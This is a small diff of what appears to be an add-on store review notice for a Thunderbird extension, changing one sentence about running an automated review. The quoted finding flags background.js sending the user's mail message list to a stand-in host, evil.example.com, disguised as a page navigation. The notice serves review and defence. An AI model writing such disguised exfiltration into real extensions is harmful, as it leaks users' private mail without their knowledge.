@@ -8,7 +8,7 @@ Thank you for your submission. We appreciate the effort you’ve put into creati
 2) This add-on appears to send data through a page navigation - a channel not meant for data transmission. Disguising transmission this way is not allowed, even with the user’s consent. Use a normal request and disclose what is sent.
  - background.js:12 - disguised data send (navigation) "https://evil.example.com/?d=" + messenger.messages.list(folderId)
 
-You can run this automated review yourself before submitting:
+You can run an automated review yourself before submitting:
 https://github.com/thunderbird/webext-linter
 
 ── Extended Code Review ──
